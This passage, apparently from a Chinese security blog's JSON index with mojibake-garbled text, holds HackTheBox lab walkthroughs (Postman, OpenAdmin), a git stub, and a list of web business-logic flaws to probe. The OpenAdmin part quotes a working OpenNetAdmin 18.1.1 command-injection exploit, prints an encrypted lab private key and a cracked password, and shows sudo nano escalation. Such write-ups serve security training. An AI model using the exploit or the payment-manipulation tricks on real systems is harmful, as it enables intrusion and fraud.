â€œPostmanâ€æ˜¯åŸºäºLinuxçš„é¶æœºï¼Œé¦–å…ˆåˆ©ç”¨RedisæœåŠ¡å™¨ï¼Œä½¿æ”»å‡»è€…å¯ä»¥ç”Ÿæˆè‡ªå·±çš„SSHå…¬å…±å¯†é’¥æ–‡ä»¶å¹¶å°†å…¶å†™å…¥æœåŠ¡å™¨ï¼Œä»¥è·å–å¯¹ç³»ç»Ÿçš„æœªæˆæƒè®¿é—®å¹¶å‘ç°ç”¨æˆ·ï¼ˆMattï¼‰çš„å·²åŠ å¯†çš„sshå¯†é’¥ã€‚ æˆ‘ä»¬å°†è·å–åˆ°çš„åŠ å¯†çš„sshå¯†é’¥ä½¿ç”¨JohnTheRipperå¯¹å…¶è¿›è¡Œç ´è§£ä»¥è·å¾—sshçš„å¯†ç ã€‚ ä¹‹åï¼Œå†åˆ©ç”¨10000ç«¯å£ä¸Šçš„Webmin Portalï¼Œä»¥Mattçš„èº«ä»½ç™»å½•å¹¶è®¿é—®Webminé¢æ¿ã€‚ æœ€åï¼Œæˆ‘ä»¬åœ¨Webminé¢æ¿ä¸­æœç´¢äº†å…³äºç‰ˆæœ¬å·çš„æ¼æ´åˆ©ç”¨ï¼Œå¹¶é€šè¿‡metasploitæˆåŠŸåœ°åˆ©ç”¨äº†è¯¥æ¼æ´å¹¶è·å¾—äº†rootã€‚ 0x05 Reference [https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin 1.910 - Remote Code Execution using BurpSuite](https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin 1.910 - Remote Code Execution using BurpSuite) https://blog.csdn.net/test1988x/article/details/103921210 https://www.soeren.codes/2019/12/24/postbox-writeup/","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::OpenAdmin Walkthrough","date":"2020-02-10T04:07:37.000Z","path":"Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough/","text":"HTB::OpenAdmin Walkthrough 0x01 åŸºæœ¬ä¿¡æ¯ 0x02 ä½¿ç”¨å·¥å…·å’ŒçŸ¥è¯†ç‚¹ nmap dirbuster ssh2john.py john opennetadmin v18.1.1 exploit netstat -tulpn nano 0x03 æ¸—é€æµ‹è¯•è¿‡ç¨‹ ç«¯å£æ¢æµ‹ 1234567891011121314151617181920root@ca01h:~# nmap -sC -sV -T5 10.10.10.171Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-07 18:31 HKTNmap scan report for 10.10.10.171Host is up (0.14s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)| 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)|_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works993/tcp closed imaps1025/tcp closed NFS-or-IISService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 76.12 seconds ç›®æ ‡é¶æœºå¼€æ”¾äº†22 SSHå’Œ80 HTTPç«¯å£ï¼Œå…¶ä¸­80ç«¯å£ä¸Šè¿è¡Œç€ApacheæœåŠ¡ï¼Œæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è®¿é—®è¯¥ç«¯å£ï¼Œå‘ç°æ˜¯Apacheçš„é»˜è®¤èµ·å§‹é¡µï¼š ç›®å½•æ¢æµ‹ ä½¿ç”¨DirBusterå·¥å…·å’ŒKaliè‡ªå¸¦çš„å­—å…¸directory-list-2.3-medium.txtå¯¹ç«™ç‚¹è¿›è¡Œç›®å½•çˆ†ç ´ï¼š DirBusteræš‚æ—¶å°±æ”¾åœ¨åå°ï¼Œç›®å‰çˆ†ç ´å‡ºæ¥çš„ä¸»è¦æ˜¯ä¸¤ä¸ªç›®å½•ï¼šonaå’Œmusicã€‚æˆ‘ä»¬ç›´æ¥å°è¯•http://10.10.10.171/ona/é¡µé¢ï¼š æœ‰ä¸€ä¸ªDOWNLOADé“¾æ¥ï¼Œç‚¹è¿›å»çœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯OpenNetAdminå®˜ç½‘ï¼Œå¹¶ä¸”å½“å‰çš„ç‰ˆæœ¬å·æ˜¯v18.1.1ã€‚ OpenNetAdmin is an opensource IP Address Management (IPAM) system. ç›´æ¥å»Googleä¸€ä¸‹opennetadmin v18.1.1 exploitï¼Œå‘ç°ExploitDBåˆ—å‡ºäº†ä¸¤ä¸ªexploitï¼š https://www.exploit-db.com/exploits/47691 https://www.exploit-db.com/exploits/47772 æ¼æ´åˆ©ç”¨ 1234567891011121314151617181920212223# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution# Date: 2019-11-19# Exploit Author: mattpascoe# Vendor Homepage: http://opennetadmin.com/# Software Link: https://github.com/opennetadmin/ona# Version: v18.1.1# Tested on: Linux # Exploit Title: OpenNetAdmin v18.1.1 RCE# Date: 2019-11-19# Exploit Author: mattpascoe# Vendor Homepage: http://opennetadmin.com/# Software Link: https://github.com/opennetadmin/ona# Version: v18.1.1# Tested on: Linux #!/bin/bash URL=&quot;$&#123;1&#125;&quot;while true;do echo -n &quot;$ &quot;; read cmd curl --silent -d &quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \\&quot;BEGIN\\&quot;;$&#123;cmd&#125;;echo \\&quot;END\\&quot;&amp;xajaxargs[]=ping&quot; &quot;$&#123;URL&#125;&quot; | sed -n -e &#x27;/BEGIN/,/END/ p&#x27; | tail -n +2 | head -n -1done å°†ä¸Šé¢çš„Bashè„šæœ¬ä¿å­˜åˆ°Kaliï¼Œå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥å¾—åˆ°åå¼¹shellï¼š 1bash ona.sh http://10.10.10.171/ona/ ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå½“å‰ç”¨æˆ·æ˜¯www-dataï¼Œä¸èƒ½æ‰§è¡Œcdå‘½ä»¤ç¦»å¼€å½“å‰ç›®å½•ï¼Œç”¨find / -type d -user www-dataæŸ¥çœ‹æœ‰æƒé™è®¿é—®çš„ç›®å½•ã€‚ find - is a linux command to find anything like file or directory. The first argument i.e / is the place to perform the search. -type - It takes f or d resembling what we are searching. f - For files d - For directories -user - This tells in connection to which user. This command will search all the files that have permission for www-data under /(complete file system) å†…å®¹å¤ªå¤šè¿™é‡Œå°±ä¸è´´ç»“æœäº†ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯/opt/ona/www/å’Œ/var/www/ona/ä¸¤ä¸ªç›®å½•ï¼Œé¦–å…ˆå»çœ‹configé…ç½®æ–‡ä»¶ï¼š æŸ¥çœ‹config.inc.phpï¼Œå‘ç°æœ‰ä¸€ä¸ªæ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼š 12// Include the localized Database settings$dbconffile = &quot;&#123;$base&#125;/local/config/database_settings.inc.php&quot;; æ‰¾åˆ°äº†mysqlçš„ç™»å½•ç”¨æˆ·å¯†ç ï¼šn1nj4W4rri0R!ï¼Œå†çœ‹ä¸€ä¸‹/var/www/ç›®å½•ï¼Œå‘ç°æœ‰ä¸€ä¸ªinternalç›®å½•å±äºJimmyç”¨æˆ·ï¼Œç”¨Jimmyå’Œmysqlçš„å¯†ç ç™»å½•SSHã€‚ 12345678910111213141516171819jimmy@openadmin:~$ cd /var/www/internaljimmy@openadmin:/var/www/internal$ ls -latotal 20drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .drwxr-xr-x 4 root root 4096 Nov 22 18:15 ..-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php-rwxrwxr-x 1 jimmy internal 185 Nov 23 16:37 logout.php-rwxrwxr-x 1 jimmy internal 339 Nov 23 17:40 main.phpjimmy@openadmin:/var/www/internal$ cat main.php&lt;?php session_start(); if (!isset ($_SESSION[&#x27;username&#x27;])) &#123; header(&quot;Location: /index.php&quot;); &#125;; # Open Admin Trusted# OpenAdmin$output = shell_exec(&#x27;cat /home/joanna/.ssh/id_rsa&#x27;);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;?&gt;&lt;html&gt;&lt;h3&gt;Don&#x27;t forget your &quot;ninja&quot; password&lt;/h3&gt;Click here to logout &lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&gt;Session&lt;/html&gt; mian.phpæ–‡ä»¶æç¤ºé€šè¿‡ç™»å½•è®¤è¯jimmyç”¨æˆ·è¾“å‡ºå¦ä¸€ä¸ªç”¨æˆ·joannaçš„rsaå¯†é’¥ï¼Œç°åœ¨æˆ‘ä»¬å°±éœ€è¦çŸ¥é“ï¼Œè¿™ä¸ªæœåŠ¡è¿è¡Œåœ¨å“ªä¸ªç«¯å£ä¸Š 1234567891011jimmy@openadmin:~$ curl http://localhost/main.php&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt; ä¸æ˜¯æ™®é€šçš„80ç«¯å£ï¼Œè¿è¡Œnetstat -tulpnå‘½ä»¤ï¼š 12345678910111213immy@openadmin:~$ netstat -tulpn(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - åˆ—å‡ºæ¥çš„ç«¯å£ä¸­æœ€æœ‰å¯èƒ½çš„å°±æ˜¯52846ï¼š 1234567891011121314151617181920212223242526272829303132333435url http:&#x2F;&#x2F;localhost:52846&#x2F;main.php&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6DkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8ad&#x2F;StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YOShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE6xaubNKhDJKs&#x2F;6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5&#x2F;Duy8byJ&#x2F;3I3&#x2F;EsqHphIHgD3UfvHy9naXc&#x2F;nLUup7s0+WAZ4AUx&#x2F;MJnJV2nN8o69JyI9z7V9E4q&#x2F;aKCh&#x2F;xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv&#x2F;dEVEppvIDE&#x2F;8h&#x2F;&#x2F;U1cPvX9Aci0EUys3naB6pVW8i&#x2F;IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH40ZNca5xHPij8hvUR2v5jGM&#x2F;8bvr&#x2F;7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN&#x2F;AZfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80X1VZ+N7S8ZP+7djB22vQ+&#x2F;pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFgS33lgrCM4&#x2F;ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey&#x2F;ur&#x2F;4FFnonsEl16TZvolSt9RH&#x2F;19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzhTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD&#x2F;GtPmcviGCexaRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7ZuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA&#x2F;MxlYJ9FNDr1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM&#x2F;SLhS79yPzCZH8uWIrjaNaZmDSPC&#x2F;z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7&#x2F;ee6KDTl7JMdV25DM9a16JYOneRtMtqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adtz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQeK1I1cqiDbVE&#x2F;bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw&#x2F;iMKhpITWLWApA3k9EN-----END RSA PRIVATE KEY-----&lt;&#x2F;pre&gt;&lt;html&gt;&lt;h3&gt;Don&#39;t forget your &quot;ninja&quot; password&lt;&#x2F;h3&gt;Click here to logout &lt;a href&#x3D;&quot;logout.php&quot; tite &#x3D; &quot;Logout&quot;&gt;Session&lt;&#x2F;html&gt; è§£å¯†rsaå¾—åˆ°ä¸€ä¸ªå¯†ç å«bloodninjasï¼š 12345678910111213kali@kali:~/Desktop$ python /usr/share/john/ssh2john.py joanna_rsa &gt; joanna_rsa.hashkali@kali:~/Desktop$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa.hash Using default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 2 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusbloodninjas (joanna_rsa)1g 0:00:00:16 DONE (2020-02-09 08:19) 0.06172g/s 885290p/s 885290c/s 885290C/sa6_123..*7Â¡Vamos!Session completed ç»å°è¯•è¿™ä¸ªå¯†ç å¹¶ä¸æ˜¯joannaçš„sshè¿æ¥å¯†ç ï¼Œè€Œæ˜¯åˆ©ç”¨å¯†é’¥è¿æ¥sshæ—¶å¯¹ç§é’¥çš„éªŒè¯å¯†ç ã€‚ä¹‹åè¿æ¥åˆ°joannaçš„sshï¼Œæ³¨æ„ä¸€å®šè¦å°†ç§é’¥çš„æ–‡ä»¶æƒé™è®¾ç½®ä¸º700ï¼š 1234567891011121314151617181920212223242526272829kali@kali:~/Desktop$ chmod 700 joanna_rsakali@kali:~/Desktop$ ssh -i joanna_rsa joanna@10.10.10.171Enter passphrase for key &#x27;joanna_rsa&#x27;: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Feb 9 14:18:59 UTC 2020 System load: 1.04 Processes: 164 Usage of /: 49.6% of 7.81GB Users logged in: 2 Memory usage: 24% IP address for ens160: 10.10.10.171 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch41 packages can be updated.12 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sun Feb 9 14:17:21 2020 from 10.10.15.190joanna@openadmin:~$ æ¥ä¸‹æ¥å°±å¯ä»¥å¾ˆç®€å•çš„æ‰¾åˆ°user.txtï¼š 1234567891011121314151617joanna@openadmin:~$ ls -latotal 48drwxr-x--- 6 joanna joanna 4096 Feb 9 14:17 .drwxr-xr-x 4 root root 4096 Nov 22 18:00 ..-rw-rw-r-- 1 joanna joanna 64 Feb 9 14:02 0lrwxrwxrwx 1 joanna joanna 9 Nov 22 18:02 .bash_history -&gt; /dev/null-rw-r--r-- 1 joanna joanna 220 Nov 22 18:00 .bash_logout-rw-r--r-- 1 joanna joanna 3771 Nov 22 18:00 .bashrcdrwx------ 2 joanna joanna 4096 Nov 22 22:42 .cachedrwx------ 3 joanna joanna 4096 Nov 22 22:42 .gnupgdrwxrwxr-x 3 joanna joanna 4096 Nov 22 18:53 .local-rw------- 1 joanna joanna 86 Feb 9 14:17 nano.save-rw-r--r-- 1 joanna joanna 807 Nov 22 18:00 .profiledrwx------ 2 joanna joanna 4096 Nov 23 17:31 .ssh-rw-rw-r-- 1 joanna joanna 33 Nov 28 09:37 user.txtjoanna@openadmin:~$ cat user.txtc9b2c[--------------]f0c81b5f sudo -lå‘½ä»¤æ˜¾ç¤ºç”¨æˆ·Joannaèƒ½å¤Ÿä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œ/bin/nano /opt/privï¼Œè€Œæ— éœ€è¾“å…¥å¯†ç ã€‚ å½“çœ‹åˆ°ç”¨æˆ·å¯ä»¥ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œnanoæ—¶ï¼Œè¿™æ˜¯æœ€ç®€å•çš„åˆ©ç”¨æ–¹æ³•ã€‚ 1234567joanna@openadmin:/$ sudo -lMatching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv å°±å¯ä»¥å¾—åˆ°/root/root.txtæ–‡ä»¶ï¼š 0x04 Reference https://decdeg.com/hackthebox-open-admin-10-10-10-171/ https://www.jianshu.com/p/9f1f9145ac3f https://xz.aliyun.com/t/3958#toc-1","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"gitå¸¸ç”¨å‘½ä»¤æ€ç»´å¯¼å›¾","date":"2020-02-05T05:07:02.000Z","path":"Other/4.gitå¸¸ç”¨å‘½ä»¤æ€ç»´å¯¼å›¾/","text":"Git Sheatcheat â€”â€”æ¬è¿è‡ªhttps://www.zhihu.com/answer/975066538","tags":[{"name":"git","slug":"git","permalink":"http://ca0y1h.top/tags/git/"}],"categories":[{"name":"æŠ€æœ¯éšç¬”","slug":"æŠ€æœ¯éšç¬”","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹é€»è¾‘æ¼æ´åˆ©ç”¨","date":"2020-01-24T05:04:54.000Z","path":"Web_security/basic_learning/19.é€»è¾‘æ¼æ´åˆ©ç”¨/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹é€»è¾‘æ¼æ´åˆ©ç”¨ é€»è¾‘æ¼æ´æ¦‚è¿° ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥è°¨æˆ–é€»è¾‘å¤ªè¿‡å¤æ‚ï¼Œå¯¼è‡´ä¸€äº›é€»è¾‘åˆ†æ”¯ä¸èƒ½æ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ï¼Œç»Ÿç§°ä¸ºä¸šåŠ¡é€»è¾‘æ¼æ´ã€‚å¸¸è§çš„é€»è¾‘æ¼æ´æœ‰äº¤æ˜“æ”¯ä»˜ã€å¯†ç ä¿®æ”¹ã€å¯†ç æ‰¾å›ã€è¶Šæƒä¿®æ”¹ã€è¶ŠæƒæŸ¥è¯¢ã€çªç ´é™åˆ¶ç­‰ï¼Œä¸‹å›¾æ˜¯ç®€å•çš„é€»è¾‘æ¼æ´æ€»ç»“ï¼Œåœ¨æŒ–æ˜çš„è¿‡ç¨‹ä¸­æ›´å¤šçš„æ—¶å€™éœ€è¦è„‘æ´å¤§å¼€ï¼š æŒ–æ˜é€»è¾‘æ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦ä¸€äº›æŠ€å·§å’Œéå¸¸è§„æ€è·¯ï¼Œæœ‰ç‚¹åƒè¾¹ç¼˜æµ‹è¯•çš„æ€æƒ³ã€‚ä¸€èˆ¬çš„æ€è·¯æ˜¯ï¼š 1ç¡®å®šä¸šåŠ¡æµç¨‹---&gt;å¯»æ‰¾æµç¨‹ä¸­å¯ä»¥è¢«æ“æ§çš„ç¯èŠ‚---&gt;åˆ†æå¯è¢«æ“æ§ç¯èŠ‚ä¸­å¯èƒ½äº§ç”Ÿçš„é€»è¾‘é—®é¢˜---&gt;å°è¯•ä¿®æ”¹å‚æ•°è§¦å‘é€»è¾‘é—®é¢˜ é€»è¾‘æ¼æ´åˆ†ç±» é¥®æ–™è´©å–æœº æ›¿æ¢è®¢å•IDï¼Œåˆ›å»ºè®¢å•æ—¶åœ¨æ”¯ä»˜ç•Œé¢ï¼Œåœ¨æ­¤åˆ›å»ºè®¢å•æ›¿æ¢è®¢å•IDï¼ˆé«˜ä»·æ›¿æ¢ä½ä»·ï¼‰ æ— é™æ–°ç”¨æˆ·ä¼˜æƒ è®¢å•ï¼Œé‡å¤åˆ›å»ºä¼˜æƒ è®¢å• æ›¿æ¢ä¼˜æƒ å·IDï¼ˆæœªè¾¾åˆ°æ¡ä»¶ä½¿ç”¨ï¼‰ ä¸ªåˆ«æƒ…å†µè®¢å•æ•°é‡ä¸º1.99æ—¶ï¼Œå®¢æˆ·ç«¯åªæ”¯ä»˜1å…ƒï¼Œå®é™…ä¸ŠæœåŠ¡å™¨è®¤ä¸ºæ”¯ä»˜äº†2å…ƒã€‚ å–è´§æ—¶å¹¶å‘ï¼ˆçœŸå®æ¡ˆä¾‹ï¼‰ ç›´æ’­ å¿«é€Ÿè¿›å‡ºæˆ¿é—´ç‚¸æˆ¿ æ— é™å‘é€ç‚¹èµåè®® ä¿®æ”¹ç¤¼ç‰©æ•°é‡ï¼Œ0ï¼Œå°æ•°ï¼Œè´Ÿæ•°ï¼Œç‰¹å®šå€¼ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ä¸º1073741824ï¼‰ ä¿®æ”¹ç¤¼ç‰©IDï¼Œéå†å°è¯•æ˜¯å¦æœ‰éšè—IDã€‚ å¹¶å‘é€ç¤¼ç‰©ï¼ŒæŠ½å¥– æ— é™åˆ›å»ºé¦–æ¬¡ä¼˜æƒ è®¢å•ï¼Œæœ‰äº›é¦–æ¬¡ä¼˜æƒ è®¢å•æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„pidï¼Œè¿™ç§çš„ç›´æ¥æ›¿æ¢pidè¿›è¡Œæ”¯ä»˜ã€‚æœ‰äº›æ˜¯ç›¸åŒçš„IDï¼Œè¿™ç§çš„æå‰åˆ›å»ºè®¢å•ï¼Œè®°å½•å¤šä¸ªè®¢å•å·åœ¨ä¾æ¬¡ä¿®æ”¹è®¢å•æ”¯ä»˜ã€‚ åˆ·å±ï¼šå‘è¨€åˆ·å±ï¼Œåˆ†äº«ï¼Œç‚¹èµç­‰æœ‰æç¤ºçš„åœ°æ–¹åˆ·å± æˆ¿é—´å†…å¯ä»¥ç”³è¯·çš„åœ°æ–¹è¿›è¡Œç”³è¯·å–æ¶ˆæ“ä½œï¼Œçœ‹çœ‹æ˜¯å¦èƒ½ç‚¸æˆ¿ã€‚ è¶Šæƒè¸¢äººï¼Œå¢åŠ ç®¡ç†å‘˜ï¼Œå…³é—­æˆ¿é—´ç­‰æ“ä½œã€‚ å‘é€çš„è¡¨æƒ…æ˜¯å¦å¯ä»¥ä¿®æ”¹é•¿å®½ï¼ˆçœŸå®æ¡ˆä¾‹ï¼‰ è´­ç‰©app è´­ä¹°æ•°é‡ï¼šä¸º0ï¼Œå°æ•°ï¼Œè´Ÿæ•°ï¼Œæ­£è´Ÿå€¼ï¼ˆAä¸º-1ï¼ŒBä¸º2ï¼Œæ€»å€¼ä¸º1ï¼‰ ä»£é‡‘å·ï¼šå¹¶å‘é¢†å–ï¼Œéå†é¢†å–ï¼ŒåŒä¸€ä¸ªä»£é‡‘å·é‡å¤ä½¿ç”¨ï¼Œæœªæ»¡è¶³æ¡ä»¶ä½¿ç”¨ä»£é‡‘å· è¶Šæƒï¼šç™»é™†ï¼Œæ“ä½œåˆ«äººè®¢å•ï¼Œä¿®æ”¹èµ„æ–™ å¤–å– å•†å“æ•°é‡ï¼Œ0ï¼Œè´Ÿæ•°ï¼Œå°æ•°ï¼Œç‰¹å®šå€¼ï¼Œæ­£è´Ÿæ•°ï¼ˆAä¸º-1ï¼ŒBä¸º2ï¼Œæ€»å€¼ä¸º1ï¼‰ é€é¤å‘˜è¯„ä»·ä¿®æ”¹ï¼Œæ˜Ÿçº§ï¼Œæ‰“èµé‡‘é¢ï¼ˆå°æ•°ï¼Œè´Ÿæ•°ï¼‰ å•†å“è¯„ä»·ï¼Œæ˜Ÿçº§ï¼Œè¯„è®ºå­—æ•°ï¼Œä¸Šä¼ å›¾ç‰‡æ˜¯å¦å¯ä»¥è‡ªå®šä¹‰æ ¼å¼ï¼Œ è®¢å•è¶…å‡ºé€é¤åœ°å€ å¼ºè¡Œè´§åˆ°ä»˜æ¬¾ï¼Œå–æ¶ˆè®¢å•ï¼Œé€€æ¬¾ è¶Šæƒæ“ä½œåˆ«äººè®¢å•ï¼Œç™»é™† ä¼˜æƒ è´­ä¹°ä¼šå‘˜ï¼ˆé‡å¤ä½¿ç”¨ä¼˜æƒ è´­ä¹°ï¼‰ äº¤æ˜“å¹³å° é’±åŒ…å¹¶å‘æç°ï¼Œè´Ÿæ•°æç° ä½¿ç”¨é’±åŒ…æ”¯ä»˜æ—¶å¤šä¸ªè®¢å•å¹¶å‘æ”¯ä»˜ï¼ˆæ˜¯å¦æ”¯ä»˜é‡‘é¢èƒ½å¤§äºä½™é¢ï¼‰ è½¬è´¦è´Ÿæ•°ï¼Œå¹¶å‘è½¬è´¦ ä¸Šæ¶å•†å“çªç ´é™åˆ¶ï¼Œä¾‹å¦‚æ•°é‡ï¼Œå­—æ•°ã€‚ æ›¿æ¢è®¢å•ï¼Œåˆ›å»ºè®¢å•å·å¦‚æœè®¢å•çŠ¶æ€å¯ä¿®æ”¹ï¼Œå…ˆè¿›åˆ°æ”¯ä»˜ç•Œé¢ï¼Œç„¶åå°†è®¢å•ä¿®æ”¹æˆæ›´å¤§çš„é‡‘é¢ï¼Œç„¶åæ”¯ä»˜æå‰è¿›å…¥çš„æ”¯ä»˜ç•Œé¢ æ•°é‡ä¿®æ”¹ ç¤¾äº¤ å¼ºè¡Œä¸¾æŠ¥ï¼ˆè¯»å–æœ¬åœ°æ¶ˆæ¯ä¸Šä¼ é‚£ç§ï¼‰ å¼ºè¡ŒåŠ å¥½å‹ï¼ˆä¸€èˆ¬å°è¯•é‡å‘é€šè¿‡å¥½å‹è¿™æ¡åè®®ï¼‰ è‡ªç”±ä¿®æ”¹å·ç ï¼ˆé“å·ç±»ï¼‰ ç¾¤ç®¡ç†æ— é™ç¦è¨€ è¶Šæƒç¦è¨€ï¼Œæ›¿äººï¼Œæ‹‰é»‘ ä¼šå‘˜ä¿®æ”¹é‡‘é¢ï¼Œæ•°é‡ã€‚æ— é™ä¼˜æƒ è´­ä¹° éä¼šå‘˜ä½¿ç”¨ä¼šå‘˜åŠŸèƒ½ æ¼«ç”» æ‰“èµé‡‘é¢ä¸ºè´Ÿæ•°ï¼Œå°æ•°ï¼Œç‰¹å®šå€¼ï¼ˆæº¢å‡ºï¼‰ è¶Šæƒåˆ é™¤è¯„è®ºï¼Œç™»é™† ä¿®æ”¹å……å€¼é‡‘é¢ ä»˜è´¹æ¼«ç”»å…è´¹çœ‹ è¯„è®ºå›¾ç‰‡æ•°é‡è¿‡å¤šä¼šå¯¼è‡´å®¢æˆ·ç«¯åŠ 